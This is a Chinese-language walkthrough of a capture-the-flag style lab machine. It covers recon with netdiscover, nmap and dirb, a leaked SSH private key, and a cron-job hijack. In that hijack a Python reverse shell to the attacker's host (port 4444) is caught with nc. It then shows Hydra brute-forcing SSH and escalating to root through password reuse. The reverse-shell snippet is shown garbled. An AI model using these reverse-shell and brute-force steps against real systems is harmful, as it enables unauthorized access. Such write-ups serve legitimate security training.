## 学习到的知识 

利用`Linux`的`/etc/crontab`文件获取`Shell`

利用`Hadry`暴力枚举`SSH`登陆密码

## 信息搜集 

先是扫描一下 `eth0` 网卡下有哪些主机存活（wifi连接的网卡）

```

netdiscover -i eth0
```

![](../Images/e5d6c9f3cf481c4ec48848636ffb0a16.png)

图片

扫描出来后，发现靶机 IP ：`192.168.0.49`，获取到 `IP` 之后对它进行 `NMAP` 端口扫描：

```

nmap -A 192.168.0.49
```

![](../Images/1e585108bdbfd0f6e835c5e930a46af8.png)

扫描出来它开放了三个端口：`22`，`80`，`111`，操作系统是`Linux`，内核版本是`3.2-4.9`（模糊）：

```


22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)cd

:df:13:76:32:4e (ED25519)#100000)


```

![](../Images/14b234425b731db432e89ed8dba8982e.png)

图片

通过扫描出来的开放服务，我对它进行来搜索，看看有没有对应的漏洞，很显然通过上图来看它们是没有漏洞的！那么我们继续从`web`开始！

使用 `dirb` 对web目录进行探测枚举：

```

dirb http://192.168.0.49/
```

![](../Images/c8878db0202af2fc2ba1e47b6fca9a3e.png)

图片

访问 `files` 是一个目录遍历，但是里面是空的；接着访问了 `http://192.168.0.49/icons/` 发现也是一个`目录遍历`，里面泄漏了很多文件：

![](../Images/ffb2c6a9733f524b3d39d35b378a2f0e.png)

图片

其中有一个文件 `VDSoyuAXiO.txt` 打开后发现是一个 `ssh` 的密钥：

```

http://192.168.0.49/icons/VDSoyuAXiO.txt
```

![](../Images/585d47d2b91663f9879df102ec4a946c.png)

图片

这个很显然是一个 `ssh-keygen` 生成的`私钥`文件！原文件名应该是：`id_rsa`，通过这个文件我们可以对它进行破解，我们先保存起！继续信息搜集！

![](../Images/6b5ef7f8359ad56ffd147fa383eda433.png)

图片

通过访问 `robots.txt` 后我发现它有两个文件，但是打开后发现没啥用：

![](../Images/02d9ad80977227c5d2891be689f952a8.png)

图片

![](../Images/98dfa815dc66fe62a776fe685683fd41.png)

图片

最后通过访问 `index.html` 发现它泄漏了一个手机号和三个用户以及一枚邮箱：

```


tel：052-452-990-054
```

![](../Images/4b2ca7e448b72790d1350b6715ea253e.png)

图片

通过信息搜集后，我从`web`得到了一些用户名、邮箱，最重要的是我还得到了一个 `ssh` 的私钥！

## 登陆SSH 

通过刚刚的信息搜集我利用 `wget` 把文件`VDSoyuAXiO.txt`下载到本地并重命名为 `id_rsa` 文件：

![](../Images/04b3bcf589c942ef58d8677cd38fc4c1.png)

图片

因为刚刚得到了几个用户，通过社工到手段再结合利用这个私钥我尝试 `ssh`登陆三个用户，最终是登陆了 `martn` 用户：

```

ssh -i id_rsa martin@192.168.0.49
```

![](../Images/1818d1f48f5bd8b7991ae6969f390b15.png)

图片

登陆到 `martin` 用户后，我通过查看 `passwd` 文件发现了三个用户，那三个用户正是刚刚信息搜集得到到用户：

```


hadi  
```

## 利用定时任务反弹Shell 

通过查看 `/etc/crontab` 目录，我发现了一个`定时任务`：

```

 cat /etc/crontab
```

![](../Images/a4d28cbca96977e1692426dfc65714cc.png)

图片

在 `/tmp`（临时目录）下有一个 `sekurity.py` 文件，`jimmy` 用户会每隔五分钟运行一次！那么，我们可不可以通过这个来反弹`Shell`呢？

通过进入 `tmp` 目录发现里面是空的，啥文件都没有：

![](../Images/ba25d5268c69fb0aa37837f603c9bc11.png)

图片

然后创建一个 `sekurity.py` 文件，里面内容是通过 socket、subprocess、os模块，通过套接字监听 `kali` 的 `ip`和`端口`：

![](../Images/363725d3d373cb112053d7a6fa3a7f2c.png)

图片

```
import

 socket,subprocess,os;"192.168.0.6",4444
));0
);1
); 2
);"/bin/bash","-i"
]);
```

然后 `Kali` 使用 `nc` 监听 `4444` 端口：

```

nc -lnvp 4444
```

过了五分钟后，通过nc得到了一枚shell：

![](../Images/c88520f6c2ad1b118fc6175ebcdaa7d2.png)

图片

通过信息收集发现 `jimmy` 用户没得 `flag` 文件，那么估计就在 `hadi` 用户哪里！

![](../Images/eca5e8461638a39c21ebab806118a5fb.png)

图片

这个时候我通过一系列的翻文件和一些关键信息，我没有找到可以利用的地方，没办法只能通过最暴力的办法获取`hadi`用户：`暴力枚举`！

## Hadry爆破SSH 

通过字典生成，我生成了有关 `hadi` 的字典文件：

![](../Images/de9f332fb5a0d32040d0964234e2de0d.png)

图片

![](../Images/80a7b3c3d79be9c7307673da346d1157.png)

图片

利用`Hadry`爆破`SSH`：

```


hydra -l hadi -P dic.txt 192.168.0.49 ssh  -v 
```

![](../Images/fe8181ef59accc0a9239abec7b4f02ed.png)

图片

通过暴力枚举后，得到 `hadi` 的密码是 `hadi123`！

![](../Images/b60dda064d1e2cc0015f913af8f3f159.png)

图片

通过登陆到 `hadi` 用户后，`su` 切换 `root` 用户，密码为 `hadi123`：

![](../Images/5185c39f3f6f3c4fa04a13fcc8a7f303.png)

图片

最终在 `root` 目录下得到了 `flag` ！
